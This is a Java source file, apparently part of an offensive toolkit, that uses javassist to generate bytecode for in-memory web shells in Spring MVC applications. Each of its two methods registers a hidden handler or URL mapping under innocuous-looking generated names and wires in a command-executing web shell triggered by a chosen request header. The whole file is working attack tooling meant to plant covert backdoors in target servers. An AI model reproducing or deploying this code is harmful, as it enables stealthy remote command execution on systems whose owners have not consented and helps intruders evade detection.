package com.generate;

import com.dto.ClassDto;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.util.HashMap;

import static com.Main.basePath;

public class SpringMvc {
    public static ClassDto SpringRegisterHandler(String url, String cmd, String header, String headerValue) throws Exception {
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/javaxServlet/*");
        classPool.insertClassPath(basePath + "/springBoot/*");
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass springControllerCtClass = classPool.makeClass(className);
        CtConstructor springRegisterHandlerCtConstructor = springControllerCtClass.makeClassInitializer();
        String methodName = Utils.getReadableMethodName("");
        String methodBody = Utils.loadTempFile("/SpringRegisterHandler.temp");

        //generate method
        /*
        private static String className = "";
        private static String methodName = "";
        private static String url = "";
        * */
        methodBody = methodBody.replace("{{{className}}}", className);
        methodBody = methodBody.replace("{{{methodName}}}", methodName);
        methodBody = methodBody.replace("{{{url}}}", url);
        springRegisterHandlerCtConstructor.setBody(methodBody);

        //set springController
        /*
        *     public static String header = "";
            public static String headerValue = "";
            public static String cmd = "";
        * */
        HashMap<String, String> args = new HashMap<>();
        args.put("header", header);
        args.put("headerValue", headerValue);
        args.put("cmd", cmd);
        String methodDescirpt = "public void " + methodName + "(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response);";
        Payload.generateCommandWebShell(springControllerCtClass, methodDescirpt, args);

        return new ClassDto(className, methodName, springControllerCtClass.toBytecode());
    }

    public static ClassDto springRegisterMapping(String url, String cmd, String header, String headerValue) throws Exception{
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/javaxServlet/*");
        classPool.insertClassPath(basePath + "/springBoot/*");
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass springControllerCtClass = classPool.makeClass(className);
        CtConstructor springRegisterHandlerCtConstructor = springControllerCtClass.makeClassInitializer();
        String methodName = Utils.getReadableMethodName("");
        String methodBody = Utils.loadTempFile("/SpringRegisterMapping.temp");

        //generate method
        /*
        private static String className = "";
        private static String methodName = "";
        private static String url = "";
        * */
        methodBody = methodBody.replace("{{{className}}}", className);
        methodBody = methodBody.replace("{{{methodName}}}", methodName);
        methodBody = methodBody.replace("{{{url}}}", url);

        springRegisterHandlerCtConstructor.setBody(methodBody);

        //set springController
        /*
        *     public static String header = "";
            public static String headerValue = "";
            public static String cmd = "";
        * */
        HashMap<String, String> args = new HashMap<>();
        args.put("header", header);
        args.put("headerValue", headerValue);
        args.put("cmd", cmd);
        String methodDescirpt = "public void " + methodName + "(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response);";
        Payload.generateCommandWebShell(springControllerCtClass, methodDescirpt, args);

        return new ClassDto(className, methodName, springControllerCtClass.toBytecode());
    }
}
